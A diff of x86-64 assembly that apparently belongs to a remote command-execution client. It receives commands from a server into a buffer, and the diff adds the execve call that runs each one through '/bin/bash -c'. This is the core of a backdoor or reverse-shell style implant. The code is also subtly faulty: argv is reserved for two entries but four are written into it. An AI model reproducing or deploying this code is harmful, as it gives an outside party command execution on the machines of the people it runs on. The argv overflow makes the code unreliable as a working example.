@@ -14,12 +14,14 @@ section .data
     sleep_nsec dq 50000000                  ; nanoseconds (50ms)
     ; Misc data
     bash_path db "/bin/bash", 0x0           ; Path to shell
+    bash_cmd_str db "-c", 0x0               ; Bash command string option
     cmd_buffer_length dq 0x0                ; Length of the cmd_buffer
-
+    
 section .bss
     rx_buffer resb 0x400                    ; Receiving buffer from the server, 1KB max
     tx_buffer resb 0x400                    ; Transmitting buffer to the server, 1KB max
     cmd_buffer resb 0x100                   ; Buffer for received command
+    argv resq 0x2                           ; Argument values for execve call
 
 section .text
     global _start
@@ -135,10 +137,23 @@ fn_buffer_copy:
 fn_exec_cmd:
     push rbp
     mov rbp, rsp
-    sub rsp, 0x8                ; Stackframe
+    sub rsp, 0x28                ; Stackframe
 
+    ; argv loading
+    lea rdi, [bash_path]        ; argv[0] = /bin/bash
+    mov [argv], rdi
+    lea rdi, [bash_cmd_str]     ; argv[1] = -c
+    mov [argv+8], rdi
+    lea rdi, [cmd_buffer]       ; argv[2] = command to execute
+    mov [argv+16], rdi
+    xor rdi, rdi                ; argv[3] = NULL
+    mov [argv+24], rdi
+    
     mov rax, 0x3b               ; execve syscall
-    lea rdi, [bash_path]        ; Load address to bash path
+    lea rdi, [bash_path]        ; char *filename
+    lea rsi, [argv]             ; char *argv
+    mov rdx, 0x0                ; char *envp
+    syscall
 
     mov rsp, rbp
     pop rbp
